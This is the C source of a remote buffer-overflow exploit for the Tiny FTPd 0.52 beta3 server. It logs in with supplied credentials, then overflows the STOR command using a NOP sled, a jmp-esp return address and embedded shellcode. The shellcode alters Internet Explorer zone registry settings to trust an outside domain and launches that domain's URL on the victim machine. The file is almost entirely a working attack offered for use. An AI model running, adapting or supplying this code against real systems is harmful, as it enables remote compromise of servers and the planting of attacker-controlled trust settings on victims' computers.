/*=========================================================================
====
   Tiny FTPd 0.52 beta3 exploit
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =========================================================================
====
*/

#include    <stdio.h>
#include    <string.h>
#include    <windows.h>
#include    <winsock.h>

#define     FTP_PORT        21
#define     MAXBUF          2000
#define     MAXPACKETBUF    32000
#define     RETADR          268
#define     JMPESP_1        0xff
#define     JMPESP_2        0xe4
#define     NOP             0x90
#define     KERNEL_NAME     "kernel32.dll"

static unsigned char exploit_code[1000]={
0xEB,0x67,0x5F,0x33,0xC0,0x88,0x47,0x0C,0x88,0x47,0x18,0x88,0x47,0x26,0x88,
0x47,
0x34,0x88,0x47,0x43,0x88,0x47,0x51,0x88,0x47,0x56,0x89,0x47,0x57,0x33,0xDB,
0xB3,
0xB8,0x03,0xDF,0x88,0x03,0x43,0x88,0x43,0x07,0x88,0x43,0x20,0x57,0xB8,0x50,
0x77,
0xF7,0xBF,0xFF,0xD0,0x8B,0xF0,0x33,0xDB,0xB3,0x19,0x03,0xDF,0x53,0x56,0xB8,
0x28,
0x6E,0xF7,0xBF,0xFF,0xD0,0x33,0xD2,0xB2,0x5B,0x03,0xD7,0x52,0xBA,0xFF,0xFF,
0xFF,
0xFF,0x52,0x33,0xC9,0x51,0x33,0xD2,0xB2,0x63,0x03,0xD7,0x52,0xB1,0x01,0xC1,
0xE1,
0x1F,0x80,0xC9,0x03,0x51,0xFF,0xD0,0xEB,0x02,0xEB,0x5B,0x33,0xDB,0xB3,0x27,
0x03,
0xDF,0x53,0x56,0xB8,0x28,0x6E,0xF7,0xBF,0xFF,0xD0,0x33,0xD2,0xB2,0x5F,0x03,
0xD7,
0x52,0x33,0xD2,0xB2,0xB9,0x03,0xD7,0x52,0x33,0xD2,0xB2,0x5B,0x03,0xD7,0x8B,
0x1A,
0x53,0xFF,0xD0,0x33,0xDB,0xB3,0x35,0x03,0xDF,0x53,0x56,0xB8,0x28,0x6E,0xF7,
0xBF,
0xFF,0xD0,0x33,0xC9,0xB1,0x04,0x51,0x33,0xD2,0xB2,0x57,0x03,0xD7,0x52,0x51,
0x33,
0xD2,0x52,0x33,0xD2,0xB2,0x52,0x03,0xD7,0x52,0x33,0xD2,0xB2,0x5F,0x03,0xD7,
0x8B,
0x1A,0x53,0xFF,0xD0,0xEB,0x02,0xEB,0x38,0x33,0xDB,0xB3,0x0C,0xFE,0xC3,0x03,
0xDF,
0x53,0xB8,0x50,0x77,0xF7,0xBF,0xFF,0xD0,0x8B,0xF0,0x33,0xDB,0xB3,0x44,0x03,
0xDF,
0x53,0x56,0xB8,0x28,0x6E,0xF7,0xBF,0xFF,0xD0,0x33,0xDB,0xB3,0x01,0x53,0x33,
0xDB,
0x53,0x53,0x33,0xC9,0xB1,0xC1,0x03,0xCF,0x51,0x53,0x53,0xFF,0xD0,0x90,0xEB,
0xFD,
0xE8,0xFD,0xFE,0xFF,0xFF,0x00};

#define WORKAREA    \
"advapi32.dll*shell32.dll*RegOpenKeyExA*RegCreateKeyA*"\
"RegSetValueExA*ShellExecuteA*http*000011112222.DEFAULT"\
"\\Software\\Microsoft\\Windows\\CurrentVersion"\
"\\Internet Settings\\ZoneMap\\Domains\\*"

#define DOMAIN  "backsection.net"
#define URL     "http://shadowpenguin.backsection.net/ocx/sample.html"

unsigned int search_mem(unsigned char *st,unsigned char *ed,
                unsigned char c1,unsigned char c2)
{
    unsigned char   *p;
    unsigned int    adr;

    for (p=st;p<ed;p++)
        if (*p==c1 && *(p+1)==c2){
            adr=(unsigned int)p;
            if ((adr&0xff)==0) continue;
            if (((adr>>8)&0xff)==0) continue;
            if (((adr>>16)&0xff)==0) continue;
            if (((adr>>24)&0xff)==0) continue;
            return(adr);
        }
    return(0);
}

main(int argc,char *argv[])
{
    SOCKET               sock;
    SOCKADDR_IN          addr;
    WSADATA              wsa;
    WORD                 wVersionRequested;
    unsigned int         i,kp,ip,p1,p2,p;
    unsigned int         pretadr;
    static unsigned char buf[MAXBUF],packetbuf[MAXPACKETBUF],*q;
    struct hostent       *hs;
    MEMORY_BASIC_INFORMATION meminfo;

    if (argc<3){
        printf("usage: %s VictimHost UserName Password\n",argv[0]);
        exit(1);
    }
    if ((void *)(kp=(unsigned int)LoadLibrary(KERNEL_NAME))==NULL){
        printf("Can not find %s\n",KERNEL_NAME);
        exit(1);
    }

    VirtualQuery((void *)kp,&meminfo,sizeof(MEMORY_BASIC_INFORMATION));
    pretadr=0;
    for (i=0;i<meminfo.RegionSize;i++){
        p=kp+i;
        if ( ( p     &0xff)==0
          || ((p>>8 )&0xff)==0
          || ((p>>16)&0xff)==0
          || ((p>>24)&0xff)==0) continue;
        if (*((unsigned char *)p)==JMPESP_1 && *(((unsigned char *)p)+1)==
JMPESP_2) pretadr=p;
    }
    printf("RETADR         : %x\n",pretadr);
    if (pretadr==0){
        printf("Can not find codes which are used by exploit.\n");
        exit(1);
    }

    wVersionRequested = MAKEWORD( 2, 0 );
    if (WSAStartup(wVersionRequested , &wsa)!=0){
        printf("Winsock Initialization failed.\n"); return -1;
    }
    if ((sock=socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET){
        printf("Can not create socket.\n"); return -1;
    }
    addr.sin_family     = AF_INET;
    addr.sin_port       = htons((u_short)FTP_PORT);
    if ((addr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
            if ((hs=gethostbyname(argv[1]))==NULL){
                printf("Can not resolve specified host.\n"); return -1;
            }
            addr.sin_family = hs->h_addrtype;
            memcpy((void *)&addr.sin_addr.s_addr,hs->h_addr,hs->h_length);
    }
    if (connect(sock,(LPSOCKADDR)&addr,sizeof(addr))==SOCKET_ERROR){
        printf("Can not connect to specified host.\n"); return -1;
    }
    recv(sock,packetbuf,MAXPACKETBUF,0);
    sprintf(packetbuf,"user %s\r\n",argv[2]);
    send(sock,packetbuf,strlen(packetbuf),0);
    recv(sock,packetbuf,MAXPACKETBUF,0);
    sprintf(packetbuf,"pass %s\r\n",argv[3]);
    send(sock,packetbuf,strlen(packetbuf),0);
    recv(sock,packetbuf,MAXPACKETBUF,0);

    memset(buf,NOP,MAXBUF); buf[MAXBUF-1]=0;

    ip=pretadr;
    buf[RETADR  ]=ip&0xff;
    buf[RETADR+1]=(ip>>8)&0xff;
    buf[RETADR+2]=(ip>>16)&0xff;
    buf[RETADR+3]=(ip>>24)&0xff;

    p1=(unsigned int)GetProcAddress((HINSTANCE)kp,"LoadLibraryA");
    p2=(unsigned int)GetProcAddress((HINSTANCE)kp,"GetProcAddress");

    printf("LoadLibraryA   : %x\n",p1);
    printf("GetProcAddress : %x\n",p2);
    if ( ( p1     &0xff)==0
      || ((p1>>8 )&0xff)==0
      || ((p1>>16)&0xff)==0
      || ((p1>>24)&0xff)==0
      || ( p2     &0xff)==0
      || ((p2>>8 )&0xff)==0
      || ((p2>>16)&0xff)==0
      || ((p2>>24)&0xff)==0){
        printf("NULL code is included.\n");
        exit(1);
    }
    exploit_code[0x28]=strlen(DOMAIN);
    exploit_code[0x2B]=strlen(URL)+strlen(DOMAIN)+1;
    exploit_code[0xf5]=strlen(DOMAIN)+186;

    exploit_code[0x2e]=exploit_code[0xd2]=p1&0xff;
    exploit_code[0x2f]=exploit_code[0xd3]=(p1>>8)&0xff;
    exploit_code[0x30]=exploit_code[0xd4]=(p1>>16)&0xff;
    exploit_code[0x31]=exploit_code[0xd5]=(p1>>24)&0xff;
    exploit_code[0x3f]=exploit_code[0x74]=p2&0xff;
    exploit_code[0x40]=exploit_code[0x75]=(p2>>8)&0xff;
    exploit_code[0x41]=exploit_code[0x76]=(p2>>16)&0xff;
    exploit_code[0x42]=exploit_code[0x77]=(p2>>24)&0xff;
    exploit_code[0x9c]=exploit_code[0xe3]=p2&0xff;
    exploit_code[0x9d]=exploit_code[0xe4]=(p2>>8)&0xff;
    exploit_code[0x9e]=exploit_code[0xe5]=(p2>>16)&0xff;
    exploit_code[0x9f]=exploit_code[0xe6]=(p2>>24)&0xff;

    strcat(exploit_code,WORKAREA);
    strcat(exploit_code,DOMAIN);
    strcat(exploit_code,"*");
    strcat(exploit_code,URL);

    memcpy(buf+RETADR+4,exploit_code,strlen(exploit_code));

    sprintf(packetbuf,"stor %s\r\n",buf);
    send(sock,packetbuf,strlen(packetbuf),0);
    Sleep(3000);
    closesocket(sock);
    printf("Done.\n");
    return FALSE;
}